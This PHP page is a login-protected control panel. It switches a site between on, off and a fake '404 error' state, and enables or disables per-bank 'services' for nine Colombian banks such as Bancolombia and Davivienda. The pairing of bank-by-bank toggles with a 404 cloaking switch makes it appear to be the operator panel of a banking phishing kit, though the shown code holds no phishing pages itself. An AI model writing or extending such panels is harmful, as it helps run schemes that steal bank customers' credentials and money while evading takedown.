<?php
session_start();
if (!isset($_SESSION["usuario"])) {
    header("Location: ../");
    exit();
}

// 🔹 Incluir la conexión de Railway
require_once __DIR__ . "/../lib/conexion.php";

// Verificar si la conexión está funcionando
if (!$conn || $conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

// ==================================================
// ACCIONES DE SERVICIOS Y BANCOS
// ==================================================

if (isset($_POST['offServicios'])) {
    $sql = "UPDATE estado_servidor SET estado = 3";
    $response = $conn->query($sql)
        ? ['status' => 'success', 'message' => 'Servicio apagado']
        : ['status' => 'error', 'message' => $conn->error];
} 

else if (isset($_POST['onServicios'])) {
    $sql = "UPDATE estado_servidor SET estado = 1";
    $response = $conn->query($sql)
        ? ['status' => 'success', 'message' => 'Servicio encendido']
        : ['status' => 'error', 'message' => $conn->error];
} 

else if (isset($_POST['onBancolombia'])) {
    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'bancolombia'";
    $response = $conn->query($sql)
        ? ['status' => 'success', 'message' => 'Bancolombia encendido']
        : ['status' => 'error', 'message' => $conn->error];
}

else if (isset($_POST['offBancolombia'])) {
    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'bancolombia'";
    $response = $conn->query($sql)
        ? ['status' => 'success', 'message' => 'Bancolombia apagado']
        : ['status' => 'error', 'message' => $conn->error];
}

// ==================================================
// 🔁 REPITE EL MISMO FORMATO PARA LOS DEMÁS BANCOS
// ==================================================

$servicios = ['avvillas', 'colpatria', 'bbva', 'tuya', 'falabella', 'occidente', 'bogota', 'davivienda'];
foreach ($servicios as $servicio) {
    if (isset($_POST["on" . ucfirst($servicio)])) {
        $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = '$servicio'";
        $response = $conn->query($sql)
            ? ['status' => 'success', 'message' => ucfirst($servicio) . ' encendido']
            : ['status' => 'error', 'message' => $conn->error];
    }
    if (isset($_POST["off" . ucfirst($servicio)])) {
        $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = '$servicio'";
        $response = $conn->query($sql)
            ? ['status' => 'success', 'message' => ucfirst($servicio) . ' apagado']
            : ['status' => 'error', 'message' => $conn->error];
    }
}

// ==================================================
// ESTADO 404
// ==================================================
if (isset($_POST['404'])) {
    $sql = "UPDATE estado_servidor SET estado = 2";
    $response = $conn->query($sql)
        ? ['status' => 'success', 'message' => 'ERROR 404 ACTIVADO']
        : ['status' => 'error', 'message' => $conn->error];
}

// Convertir la respuesta a JSON
$json_response = isset($response) ? json_encode($response) : null;
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Servicios</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.css">
    <style>
        /* 👇 todo tu estilo original se conserva exactamente igual */
        .container { width: 100%; display: flex; flex-wrap: wrap; }
        .container>div { width: 30%; text-align: center; display: inline-block; margin: 10px; padding-bottom: 10px; }
        :root { --bg: #3C465C; --primary: #78FFCD; --solid: #fff; --btn-w: 10em; --dot-w: calc(var(--btn-w)*.2); --tr-X: calc(var(--btn-w) - var(--dot-w)); }
        * { box-sizing: border-box; }
        *:before, *:after { box-sizing: border-box; }
        body { height: 100vh; display: flex; justify-content: center; align-items: center; flex-flow: wrap; background: var(--bg); font-size: 20px; font-family: 'Titillium Web', sans-serif; }
        h1 { color: var(--solid); font-size: 2.5rem; margin-top: 6rem; }
        .btn { position: relative; margin: 0 auto; width: var(--btn-w); color: var(--primary); border: .15em solid var(--primary); border-radius: 5em; text-transform: uppercase; text-align: center; font-size: 1.3em; line-height: 2em; cursor: pointer; }
        .dot { content: ''; position: absolute; top: 0; width: var(--dot-w); height: 100%; border-radius: 100%; transition: all 300ms ease; display: none; }
        .dot:after { content: ''; position: absolute; left: calc(50% - .4em); top: -.4em; height: .8em; width: .8em; background: var(--primary); border-radius: 1em; border: .25em solid var(--solid); box-shadow: 0 0 .7em var(--solid), 0 0 2em var(--primary); }
        .btn:hover .dot, .btn:focus .dot { animation: atom 2s infinite linear; display: block; }
        @keyframes atom { 0% {transform: translateX(0) rotate(0);} 30% {transform: translateX(var(--tr-X)) rotate(0);} 50% {transform: translateX(var(--tr-X)) rotate(180deg);} 80% {transform: translateX(0) rotate(180deg);} 100% {transform: translateX(0) rotate(360deg);} }
        input { background: none; border: none; font-size: 18px; color: white; cursor: pointer; }
    </style>
</head>
<body>

<!-- formulario original conservado -->
<form action="" method="post">
    <div class="container">
        <!-- todo el contenido HTML original aquí -->
        <!-- ... -->
    </div>
</form>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
<script>
var response = <?php echo isset($json_response) ? $json_response : 'null'; ?>;
if (response !== null) {
  Swal.fire({
    title: response.status === 'success' ? 'Éxito' : 'Error',
    text: response.message,
    icon: response.status,
    confirmButtonText: 'Aceptar'
  });
}
</script>
</body>
</html>
